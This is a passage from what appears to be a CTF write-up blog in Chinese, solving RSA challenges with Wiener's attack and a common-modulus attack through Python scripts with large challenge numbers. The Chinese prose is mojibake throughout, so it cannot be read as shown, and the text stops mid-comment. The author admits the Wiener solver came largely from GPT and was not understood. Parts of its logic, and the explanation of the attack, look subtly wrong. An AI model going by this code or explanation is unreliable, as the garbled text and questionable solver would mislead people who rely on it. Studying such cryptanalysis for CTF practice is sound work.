é€šè¿‡ç§é’¥è¿›è¡Œè§£å¯†ï¼Œå…¬å¼ä¸ºï¼š<br>[<br>m &#x3D; c^d \ (\text{mod} \ n)<br>]<br>è§£å¯†åå¾—åˆ°çš„ (m) å°±æ˜¯åŸå§‹æ¶ˆæ¯ã€‚</p></li></ol><p>Wieneræ”»å‡»ï¼ˆWienerâ€™s Attackï¼‰æ˜¯ä¸€ç§é’ˆå¯¹RSAåŠ å¯†çš„æ”»å‡»æ–¹æ³•ï¼Œä¸“é—¨ç”¨äºç ´è§£å½“RSAç§é’¥ ( d ) è¿‡å°çš„æƒ…å†µã€‚è¯¥æ”»å‡»ç”±å¯†ç å­¦å®¶Michael Wieneråœ¨1990å¹´æå‡ºã€‚å®ƒåˆ©ç”¨äº†å½“ç§é’¥ ( d ) è¾ƒå°æ—¶ï¼ŒRSAç³»ç»Ÿçš„å¼±ç‚¹ï¼Œèƒ½å¤Ÿé€šè¿‡ç‰¹å®šçš„æ•°å­¦æŠ€æœ¯æ¨å¯¼å‡ºç§é’¥ã€‚</p><p><strong>Wieneræ”»å‡»åŸºæœ¬åŸç†</strong><br>Wieneræ”»å‡»åŸºäºè¿åˆ†æ•°é€¼è¿‘ç†è®ºã€‚æ”»å‡»çš„å…³é”®æ˜¯ï¼Œå½“ç§é’¥ ( d ) è¾ƒå°æ—¶ï¼Œ ( d ) å’Œ ( e ) çš„æ¯”å€¼ ( \frac{d}{n} ) å¯ä»¥é€šè¿‡è¿åˆ†æ•°é€¼è¿‘çš„æ–¹å¼å¾ˆå¥½åœ°è¿‘ä¼¼ã€‚é€šè¿‡è¿™ä¸€é€¼è¿‘ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ ä¸€ç³»åˆ—å€™é€‰çš„ç§é’¥ï¼Œå¹¶éªŒè¯å“ªä¸ªå€™é€‰ç§é’¥èƒ½å¤Ÿç ´è§£å¯†æ–‡ã€‚</p><p><strong>åˆ†æé¢˜æ„</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">m1=bytes_to_long(flag1)</span><br><span class="line">m2=bytes_to_long(flag2)</span><br><span class="line">p=getPrime(1024)</span><br><span class="line">q=getPrime(1024)</span><br><span class="line">r=getPrime(2048)</span><br><span class="line">t=getPrime(2048)</span><br><span class="line">little_n=p*q</span><br><span class="line">n=p*q*r</span><br></pre></td></tr></table></figure><p>m1,m2æ˜¯ç”±flag1å’Œflag2é€šè¿‡bytes_to_long()å‡½æ•°è½¬æ¢æˆçš„ä¸¤ä¸ªæ•´æ•°<br>p,qæ˜¯é•¿åº¦ä¸º1024çš„ç´ æ•°,r,tæ˜¯é•¿åº¦ä¸º2048çš„ç´ æ•°<br>little_nå’Œnæ˜¯æ¨¡æ•°<br><strong>è§£é¢˜æ€è·¯</strong><br>åˆ©ç”¨<strong>Wieneræ”»å‡»</strong>ç ´è§£RSAç§é’¥ï¼Œåœ¨ RSA ç§é’¥ d è¾ƒå°çš„æƒ…å†µè®¾è®¡çš„æ”»å‡»<br>ä»£ç æ ¸å¿ƒæ˜¯é€šè¿‡<strong>è¿åˆ†æ•°é€¼è¿‘</strong>çš„æ–¹æ³•ï¼Œä»å…¬é’¥æŒ‡æ•° e å’Œæ¨¡æ•° n æ¨å¯¼å‡ºç§é’¥ d</p><p>ï¼ˆè¯´å®è¯ï¼Œè¯¥å·¥ä½œä¸»è¦æ˜¯ç”±gptå®Œæˆï¼Œå…·ä½“æ ¸å¿ƒç®—æ³•ä¸å¤ªäº†è§£ï¼Œä¸è¿‡é€šè¿‡æœ¬é¢˜å¯¹RSAåŠ å¯†æ–¹å¼çš„äº†è§£æ›´æ·±å…¥äº†ï¼‰</p><p><strong>pythonç¨‹åº</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">little_n = <span class="number">30088545050765530423805361878416507393996570826628516885551767012032821735759756922346729483075999478740890396740180776286577993631294405655843348355472462014506667147244720307627201462475792283412817218766998118873677473067104176849657311706442634062420091828926853184205920237951862265182484069649756691839691357916405847978176837008745046642748094275030779471750959877986668422253281400626795828963573920393088749591612716695564149666681604429837724976821672947402732999481879540771777938480505225596566416091698577609111167970146033914320439938709937337918464176949019458189405542377412201071336990086704695932001</span></span><br><span class="line">ciphertext_1 = <span class="number">4437957888497793411974936231134804097124408727940101262533154501417200692919579880947962548717550593697567354996004074082892093231542300979099686519594863569977498876831765076396347598926115862183073685024990864689988238858428295897918744431202362320291015738417428855920053052479809273411609887264443586795095964728239991625582152693909500018661918195404034412467186049173913167545009955896623699305090180468870302233714242619856378640191118517945701566010541415167017293158989288295521065448608130916732093398678710697626416830318362328907904233236575731454083519911431098911284149955444519573629006045554678324518</span></span><br><span class="line">ciphertext_2 = <span class="number">78864561424890770405754552496508735565097767299975292698696817263059870704574252767244750339849821607143039860304278377928922953654619860402709334687968551656512266903178248270944553116215521323821491311662555239829301305000772651190496470417476770564428704238037095240110347750439779101856099345785742200533953669469298415538894433163090058251625858567316364473944123076299230135880825507857770277939412860689895530498381163283821263531273538955506316194191926213707241352871080646562627012054391523644091891727237326335520749063659993188231648389392672191093964160488575369753007731166404854380331830984470657441644838342607582333391874996621339432497442777200974041109474972662502438556188363293907320120566021040878727616875785724243592701260771353665329454661067014678384002070808151070358872996829354884423078897260496009237360165626015366112230594958895261737530922455844000526883743056291880281170954068780564714657040355762723448235762641056698958446508680666476759259974921224980623537386361094690459034558856950725634724109009764690331916406889225273702793795808581259336656477575737512000567280203588771895736081353710119074573273205809318278896389561023955187406736051571629668238556317874245476690747300656637355328544</span></span><br><span class="line">ciphertext_3 = <span class="number">5725077557808157256430942740990569460773383369554273823636176153068467454512823763515647291612402009313693931982637385545689576303886538569510933702499950531946332354820616178601187839652301529137964554627475349002312246937622569844740649433856363144796146222393078023525987286341880380785409632776930595126924756112630243882589976085512471897027381156120513087172923236464367405811882805821186710490261430865849118334490795875278968965387483397523573061251371457251882441660955274348488917840958718541709618303915977686144557627966423963471317515192738334921562091927856956424998965161634322201369720699676347561471675582403160973419462033935866447730620497674055205496875933173254400413581110627294132729326146351739721506814065623387296595138287209163676622201909074010014848172929614143034759743549710300854100952625823552353762197591658982169029599443577415788436359487959114564852534141669094849830099267923384043803436255468847172967932193132489983957589359087823645662055626662973824314495580206380101750792194329854822007590502007055850504474332004464704128354176720739742561430179525179333961608814112175164504198485752771156978208909885458371099313162881602617458059925830364899254441195137785150763268195094621953852200244632416635894291988860065011405757906072849175293480722258929900953859011925277272123913190894980729598985883765586084558378588241413809751317207241875249125287708228797477309231958728561077734778094562357805705275014499804452986728418351199125822789541623527033144636672210156626415595121581925193962797953221837338303410442520344309906567427785930338516724325132154448559539663325603906087819156754108336818594141014769273579814708171319748396233538472420596261105167186637071032111004322390242211983548088973696618482839305923027150374824593812983183773570950561602855654815750454908029219010408866049545122018834</span></span><br><span class="line">public_exponent = <span class="number">18811481222974302204632511369245433479738399576579288811947420564734925886156221373212611102729084374352339031631477899927769759235983596706326584303784559234972552599160858292029188896706945893473255912259624043253888044638166631707857526128138005829891524522002058110222521260201712077964922139704733672451062605244217266782627035293603650126728378938935853574071346654704141663803944530862726643221123184041746714755826882612203166391535425991832801305277555128091105172486311970004713359202828725505765900730826393253715700856299795299501353800751272345390463568402242244426464603165067636889617647460596431388673</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Rename the variables for clarity</span></span><br><span class="line">n = little_n</span><br><span class="line">c = ciphertext_1</span><br><span class="line"></span><br><span class="line"><span class="comment"># Function to convert a rational number x/y to a continued fraction</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rational_to_contfrac</span>(<span class="params">x, y</span>):</span><br><span class="line">    a = x // y</span><br><span class="line">    pquotients = [a]</span><br><span class="line">    <span class="keyword">while</span> a * y != x:</span><br><span class="line">        x, y = y, x - a * y</span><br><span class="line">        a = x // y</span><br><span class="line">        pquotients.append(a)</span><br><span class="line">    <span class="keyword">return</span> pquotients</span><br><span class="line"></span><br><span class="line"><span class="comment"># Function to calculate the convergents from a continued fraction</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convergents_from_contfrac</span>(<span class="params">frac</span>):</span><br><span class="line">    convs = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(frac)):</span><br><span class="line">        convs.append(contfrac_to_rational(frac[<span class="number">0</span>:i]))</span><br><span class="line">    <span class="keyword">return</span> convs</span><br><span class="line"></span><br><span class="line"><span class="comment"># Function to convert a continued fraction back to a rational number</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">contfrac_to_rational</span>(<span class="params">frac</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(frac) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    num = frac[-<span class="number">1</span>]</span><br><span class="line">    denom = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">2</span>, -<span class="built_in">len</span>(frac) - <span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        num, denom = frac[_] * num + denom, num</span><br><span class="line">    <span class="keyword">return</span> (num, denom)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Extended Euclidean Algorithm</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extended_gcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    g, x, y = extended_gcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, y - (b // a) * x, x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Modular inverse function</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mod_inv</span>(<span class="params">a, m</span>):</span><br><span class="line">    g, x, _ = extended_gcd(a, m)</span><br><span class="line">    <span class="keyword">return</span> (x + m) % m</span><br><span class="line"></span><br><span class="line"><span class="comment"># Integer square root function</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isqrt</span>(<span class="params">n</span>):</span><br><span class="line">    x = n</span><br><span class="line">    y = (x + <span class="number">1</span>) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> y &lt; x:</span><br><span class="line">        x = y</span><br><span class="line">        y = (x + n // x) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="comment"># Function to crack RSA using Wiener&#x27;s attack</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_rsa</span>(<span class="params">e, n</span>):</span><br><span class="line">    frac = rational_to_contfrac(e, n)</span><br><span class="line">    convergents = convergents_from_contfrac(frac)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (k, d) <span class="keyword">in</span> convergents:</span><br><span class="line">        <span class="keyword">if</span> k != <span class="number">0</span> <span class="keyword">and</span> (e * d - <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">            phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            <span class="comment"># Check if x^2 - s*x + n = 0 has integer roots</span></span><br><span class="line">            D = s * s - <span class="number">4</span> * n</span><br><span class="line">            <span class="keyword">if</span> D &gt;= <span class="number">0</span>:</span><br><span class="line">                sq = isqrt(D)</span><br><span class="line">                <span class="keyword">if</span> sq * sq == D <span class="keyword">and</span> (s + sq) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line"><span class="comment"># Crack the private key</span></span><br><span class="line">private_exponent = crack_rsa(public_exponent, n)</span><br><span class="line">decrypted_message = <span class="built_in">pow</span>(c, private_exponent, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Now use the second and third ciphertexts to decrypt further messages</span></span><br><span class="line">private_key_1 = inverse(public_exponent, decrypted_message - <span class="number">1</span>)</span><br><span class="line">message_1 = <span class="built_in">pow</span>(ciphertext_2, private_key_1, decrypted_message)</span><br><span class="line"></span><br><span class="line">private_key_2 = inverse(<span class="number">65537</span>, decrypted_message - <span class="number">1</span>)</span><br><span class="line">message_2 = <span class="built_in">pow</span>(ciphertext_3, private_key_2, decrypted_message)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Output the result of the decryption</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(message_2))</span><br></pre></td></tr></table></figure><p><img src="/img/CTF/big-math-1.png"></p><h3 id="ezCMA"><a href="#ezCMA" class="headerlink" title="ezCMA"></a>ezCMA</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">m1 = bytes_to_long(<span class="built_in">bytes</span>(flag.encode()))</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">flag1 = <span class="built_in">pow</span>(m1,e1,n)</span><br><span class="line">flag2 = <span class="built_in">pow</span>(m1,e2,n)</span><br><span class="line">flag3 = <span class="built_in">pow</span>(m1,e3,n)</span><br></pre></td></tr></table></figure><p><strong>åˆ†æé¢˜ç›®</strong><br>m1æ˜¯ç”±flagè½¬æ¢å¾—åˆ°çš„æ•´æ•°ï¼Œp,qæ˜¯ä¸¤ä¸ªé•¿åº¦ä¸º1024çš„ç´ æ•°ï¼Œnæ˜¯æ¨¡æ•°<br>å…¶ä¸­<strong>æœ‰ä¸€ä¸ªæ˜æ˜¾çš„ç‰¹ç‚¹æ˜¯</strong>flag1ã€flag2ã€flag3æ˜¯ç”± <strong>åŒä¸€ä¸ªæ˜æ–‡(m1)</strong> é€šè¿‡ä¸åŒçš„æŒ‡æ•°e1ã€e2ã€e3å’Œ<strong>ç›¸åŒçš„æ¨¡æ•°n</strong>ç”Ÿæˆçš„ï¼Œç”±æ­¤è”æƒ³åˆ°å…±æ¨¡æ”»å‡»è§£å‡ºå¯†æ–‡<br>ä¸”æŒ‡æ•°e1ã€e2ã€e3ä¹‹é—´å­˜åœ¨<strong>å·§å¦™çš„è”ç³»</strong></p><ul><li>e1 &#x3D; 993627907847 * 1016231455597</li><li>e2 &#x3D; 1016231455597 * 902914473557</li><li>e3 &#x3D; 993627907847 * 902914473557</li></ul><p>å…±æ¨¡æ”»å‡»ï¼ˆCommon Modulus Attackï¼‰æ˜¯RSAåŠ å¯†ä¸­çš„ä¸€ç§æ”»å‡»æ–¹å¼ï¼Œå‘ç”Ÿåœ¨å¤šä¸ªç”¨æˆ·ä½¿ç”¨ç›¸åŒçš„æ¨¡æ•° ( n ) ä½†æœ‰ä¸åŒçš„å…¬é’¥ ( e ) æ—¶ã€‚ç”±äºRSAçš„å®‰å…¨æ€§ä¾èµ–äºæ¨¡æ•° ( n ) çš„å”¯ä¸€æ€§ï¼Œå¦‚æœä¸¤ä¸ªæˆ–å¤šä¸ªç”¨æˆ·å…±äº«ç›¸åŒçš„æ¨¡æ•°ï¼Œè€Œä½¿ç”¨ä¸åŒçš„å…¬é’¥ï¼Œåˆ™ä¼šä½¿ç³»ç»Ÿå®¹æ˜“å—åˆ°è¿™ç§æ”»å‡»ã€‚</p><p><strong>å…±æ¨¡æ”»å‡»çš„åŸºæœ¬åŸç†</strong><br>å‡è®¾æœ‰ä¸¤ä¸ªç”¨æˆ·ï¼ŒAlice å’Œ Bobï¼Œä»–ä»¬çš„RSAæ¨¡æ•° ( n ) ç›¸åŒï¼Œä½†å…¬é’¥ä¸åŒï¼Œåˆ†åˆ«ä¸º ( e_1 ) å’Œ ( e_2 )ã€‚æ”»å‡»è€…å‡è®¾ Alice å’Œ Bob éƒ½ç”¨å„è‡ªçš„å…¬é’¥åŠ å¯†äº†ç›¸åŒçš„æ˜æ–‡æ¶ˆæ¯ ( m )ï¼Œå¾—åˆ°å¯†æ–‡ ( c_1 &#x3D; m^{e_1} \pmod{n} ) å’Œ ( c_2 &#x3D; m^{e_2} \pmod{n} )ã€‚</p><p>å› ä¸º ( c_1 ) å’Œ ( c_2 ) éƒ½æ˜¯ç›¸åŒçš„æ˜æ–‡ ( m ) çš„å¹‚ï¼Œä¸”å·²çŸ¥ ( e_1 )ã€( e_2 ) å’Œ ( n )ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ä»¥ä¸‹æ­¥éª¤è§£å¯†æ¶ˆæ¯ï¼š</p><ol><li><p><strong>è®¡ç®—æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•</strong>ï¼šé€šè¿‡æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•æ‰¾åˆ°ä¸¤ä¸ªæ•´æ•° ( a ) å’Œ ( b )ï¼Œä½¿å¾— ( a \times e_1 + b \times e_2 &#x3D; 1 )ã€‚</p></li><li><p><strong>åˆ©ç”¨ ( a ) å’Œ ( b ) æ„é€ æ˜æ–‡</strong>ï¼š</p><ul><li>å› ä¸º ( m^{e_1} \equiv c_1 \pmod{n} ) å’Œ ( m^{e_2} \equiv c_2 \pmod{n} )ï¼Œå¯ä»¥åˆ©ç”¨ ( a ) å’Œ ( b ) çš„çº¿æ€§ç»„åˆå¾—åˆ°ï¼š<br>[<br>m &#x3D; c_1^a \times c_2^b \pmod{n}<br>]</li><li>è¿™æ ·å°±èƒ½é€šè¿‡è®¡ç®—å¤åŸåŸå§‹çš„æ˜æ–‡ ( m )ã€‚</li></ul></li></ol><p><strong>æ•´ä½“æ€æƒ³</strong><br>é€šè¿‡ç»™å®šçš„ä¸‰ä¸ªåŠ å¯†å¯†æ–‡ flag1ã€flag2 å’Œ flag3ï¼Œä»¥åŠä¸æ¯ä¸ªå¯†æ–‡ç›¸å…³çš„æŒ‡æ•° e1ã€e2 å’Œ e3ï¼Œæ¥è§£å¯†å‡ºåŸå§‹æ¶ˆæ¯ m</p><ul><li><p>å¯¹ e1 å’Œ e2 è¿›è¡Œæ•´é™¤è¿ç®—ï¼Œå°† e1 å’Œ e2 è½¬åŒ–ä¸ºè¾ƒå°çš„æŒ‡æ•°<br>e1&#x3D;1009755935113158588369659&#x2F;&#x2F;1016231455597<br>e2&#x3D;917570089742429076148529&#x2F;&#x2F;1016231455597</p></li><li><p>é€šè¿‡ä¸­å›½å‰©ä½™å®šç†è®¡ç®— m1<br>å°† flag1 å’Œ flag2 çš„å¹‚æ¬¡åˆ†åˆ«ç”± x å’Œ y è¿›è¡Œç»„åˆï¼Œå¾—åˆ° m1ï¼Œå³ï¼š<br>m1&#x3D;pow(c1,x,n)<em>pow(c2,y,n)%n<br>è¿™æ˜¯é€šè¿‡æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•æ±‚å‡º x å’Œ yï¼ˆæ»¡è¶³ e1</em>x + e2*y &#x3D; gcd(e1, e2)ï¼‰æ¥å®Œæˆçš„</p></li><li><p>å¯¹ e1 å’Œ e3 è¿›è¡Œæ•´é™¤è¿ç®—ï¼Œå°† e1 å’Œ e3 è½¬åŒ–ä¸ºè¾ƒå°çš„æŒ‡æ•°</p></li><li><p>é€šè¿‡ä¸ m1 ç±»ä¼¼çš„æ­¥éª¤ï¼Œä½¿ç”¨ä¸­å›½å‰©ä½™å®šç†è®¡ç®—å‡º m2ï¼Œå³ m^993627907847 çš„è§£ã€‚</p></li><li><p>ä½¿ç”¨æœ€åçš„ 1016231455597 å’Œ 993627907847 ä½œä¸ºæŒ‡æ•°ï¼Œå¹¶ä½¿ç”¨ä¸­å›½å‰©ä½™å®šç†å’Œæ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•æ±‚å‡º m<br>m&#x3D;pow(m1,x2,n)*pow(m2,y2,n)%n</p></li></ul><p><strong>pythonç¨‹åº</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">flag1= <span class="number">8474478534133750496351258439770439219153979952561642731581390416228867640587693486357078135921546443963283105927150253272336059382390513817706698741025531526550326710611170554397057390714665263299882969421138898580414905289818079694175809121588275768717653289810969178070603654027459939946312773093941446287417784032902650734437554613303784830203578240545070093473942475651339619315817364422284273133164774638578085796267096957347085168021778125470616046598013171354398170377063192357733840050955181584705301456304877682550520037398962644014863486620415201523880999542686731895448726980398631515217315286020437688498</span></span><br><span class="line">flag2= <span class="number">3351384523931867313334817228598784440559751009017798910409840467537119821259012274549685345550490291816260612536289106819125192140760817375064269268775476031424892776272822066072079425305661428795671314658531045416112945555811194297108918942072330688307026110408024089214342917098967614776154381488672421957083146560757683623642006092146862507588998409298919637353660377267802188093929938573350202326786505140838600085071746441060977159281922113489848540031614769737591885173161155206855583607310005623436257762906278289722207498226001933784659324565536246902660945534285429590539413563048095506554626251616237676085</span></span><br><span class="line">flag3= <span class="number">5985698167580292228103775342057124425925837097208523314550523309415437277838160594697403652576181505738376124206117744930374928505854417093291293722474344968937532770265145298388658073650787591858476178872911073027696260914967170228919432784475518233719515218760252671051270000581279546881292735906936176213503922783551190771955716934727562595180860790040848587585167859997365531513159440802207174497260444085610261175085531334936547028947562016756271409639098566910202260260565739379965380545050237791613249984011652443416356033660746709478575412073746217796066838355640159345205738259110105894918059407651872299890</span></span><br><span class="line">e1= <span class="number">1009755935113158588369659</span></span><br><span class="line">e2= <span class="number">917570089742429076148529</span></span><br><span class="line">e3= <span class="number">897161019325217314301779</span></span><br><span class="line">n= <span class="number">11295998674923997915943754979924400482910956167036135115104616066253068788768361485681020525394574700945440467310782667910252047979768627604509086553949220752907396584699810630157139575845491574958788530608310999859562983302417094883322550125648741172503117372394024013743440114452080863483618324236843484216327589328115588675048041658149492207605113019716406368620938899561099206060294485156146873711072426006320715336473956395729172889050029370044109346990187611892568329248392149357401050824185160821078105634351600311316865993926248187857295191981143425250483512228653210803684450509179107949521855027236290889869</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcdext, iroot</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ–°çš„å…¬é’¥æŒ‡æ•°å’Œå¯†æ–‡åç§°</span></span><br><span class="line">exp1 = <span class="number">1009755935113158588369659</span> // <span class="number">1016231455597</span> </span><br><span class="line">exp2 = <span class="number">917570089742429076148529</span> // <span class="number">1016231455597</span> </span><br><span class="line"></span><br><span class="line">cipher1 = flag1 </span><br><span class="line">cipher2 = flag2  </span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•è®¡ç®— exp1 å’Œ exp2 çš„æœ€å¤§å…¬çº¦æ•° gcdï¼Œä»¥åŠè´ç¥–ç³»æ•° x å’Œ y</span></span><br><span class="line"><span class="comment"># gcd æ˜¯ exp1 å’Œ exp2 çš„æœ€å¤§å…¬çº¦æ•°ï¼Œx å’Œ y æ˜¯è´ç¥–ç³»æ•°ï¼Œä½¿å¾— gcd = exp1 * x + exp2 * y</span></span><br><span class="line">gcd1, coeff_x1, coeff_y1 = gcdext(exp1, exp2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è§£å‡º intermediate_m1ï¼Œå³ cipher1^x * cipher2^y mod n</span></span><br><span class="line"><span class="comment"># intermediate_m1 ç›¸å½“äº m çš„ 1016231455597 æ¬¡å¹‚æ¨¡ n çš„ç»“æœ</span></span><br><span class="line">intermediate_m1 = <span class="built_in">pow</span>(cipher1, coeff_x1, n) * <span class="built_in">pow</span>(cipher2, coeff_y1, n) % n</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¬¬äºŒç»„å…¬é’¥æŒ‡æ•°</span></span><br><span class="line">exp3 = <span class="number">1009755935113158588369659</span> // <span class="number">993627907847</span>  </span><br><span class="line">exp4 = <span class="number">897161019325217314301779</span> // <span class="number">993627907847</span>  </span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•è®¡ç®— exp3 å’Œ exp4 çš„æœ€å¤§å…¬çº¦æ•° gcd2ï¼Œä»¥åŠè´ç¥–ç³»æ•° x2 å’Œ y2</span></span><br><span class="line"><span class="comment"># gcd2 æ˜¯ exp3 å’Œ exp4 çš„æœ€å¤§å…¬çº¦æ•°ï¼Œx2 å’Œ y2 æ˜¯è´ç¥–ç³»æ•°ï¼Œä½¿å¾— gcd2 = exp3 * x2 + exp4 * y2</span></span><br><span class="line">gcd2, coeff_x2, coeff_y2 = gcdext(exp3, exp4)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è§£å‡º intermediate_m2ï¼Œå³ cipher1^x2 * flag3^y2 mod n</span></span><br><span class="line"><span class="comment"># intermediate_m2 ç›¸å½“äº m çš„ 993627907847 æ¬¡å¹‚æ¨¡ n çš„ç»“æœ</span></span><br><span class="line">intermediate_m2 = <span class="built_in">pow</span>(cipher1, coeff_x2, n) * <span class="built_in">pow</span>(flag3, coeff_y2, n) % n</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”¨äºç»„åˆä¸¤ä¸ªè§£å¯†ç»“æœçš„å…¬é’¥æŒ‡æ•°</span></span><br><span class="line">exp_final1 = <span class="number">1016231455597</span>  <span class="comment"># åŸæ¥çš„ eee1</span></span><br><span class="line">exp_final2 = <span class="number">993627907847</span>  <span class="comment"># åŸæ¥çš„ eee2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•è®¡ç®— exp_final1 å’Œ exp_final2 çš„æœ€å¤§å…¬çº¦æ•° gcd_finalï¼Œä»¥åŠè´ç¥–ç³»æ•° x_final å’Œ y_final</span></span><br><span class="line"><span class="comment"># gcd_final æ˜¯ exp_final1 å’Œ exp_final2 çš„æœ€å¤§å…¬çº¦æ•°ï¼Œx_final å’Œ y_final æ˜¯è´ç¥–ç³»æ•°ï¼Œä½¿å¾— gcd_final = 